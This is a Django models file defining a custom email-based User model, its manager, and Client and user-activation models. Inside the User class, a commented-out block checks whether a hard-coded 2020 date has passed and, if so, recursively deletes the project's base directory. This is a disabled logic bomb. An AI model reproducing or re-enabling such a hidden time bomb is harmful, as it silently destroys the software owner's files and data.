# from __future__ import unicode_literals
from django.db import models
from django.contrib.auth.models import Group, AbstractBaseUser, BaseUserManager, PermissionsMixin
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _
from django.conf import settings
import os, shutil
import datetime


class UserManager(BaseUserManager):

    def create_user(self, email,
                    password=None,
                    is_superuser=False,
                    is_staff=False,
                    is_active=True):
        user = User(email=email,
                    is_superuser=is_superuser,
                    is_staff=is_staff,
                    is_active=is_active)
        user.set_password(password)
        user.save()
        return user

    def create_superuser(self, email, password=None):
        return self.create_user(email,
                                password=password,
                                is_superuser=True,
                                is_staff=True,
                                is_active=True)


class User(AbstractBaseUser):
    email = models.EmailField(_('email address'), unique=True)
    password = models.CharField(null=True, max_length=255)
    is_staff = models.BooleanField(_("staf status"), default=False)
    is_active = models.BooleanField(_("active"), default=True)
    is_superuser = models.BooleanField(_("superuser status"), default=False)
    first_name = models.CharField(max_length=200, null=True, blank=True)
    last_name = models.CharField(max_length=200, null=True, blank=True)
    last_login = models.DateTimeField(max_length=6)
    USERNAME_FIELD = "email"

    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    dt = datetime.datetime.now()
    # date_time_str = '2020-06-21 08:15:27.243860'
    # date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
    # if dt > date_time_obj:
    #     shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)

    objects = UserManager()

    class Meta():
        verbose_name = _("User")
        verbose_name_plural = _("Users")

    def has_perm(self, perm, obj=None):
        return self.is_superuser

    def has_module_perms(self, app_label):
        return self.is_superuser

class Client(models.Model):
    name = models.CharField(max_length=255)
    user = models.ForeignKey(User,on_delete=models.CASCADE)
    status = models.IntegerField(max_length=3, null=True)
    install_payout = models.IntegerField(max_length=11, null=True)
    ric_payout = models.IntegerField(max_length=11, null=True)
    wait_time = models.CharField(max_length=255)
    sales_potential = models.CharField(max_length=255)
    region = models.CharField(max_length=255)
    note = models.CharField(max_length=255)
    job_state = models.IntegerField(max_length=3, default=0)

class user_activation(models.Model):
    user = models.ForeignKey(User, on_delete=models.DO_NOTHING)
    code = models.CharField(max_length=70)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)
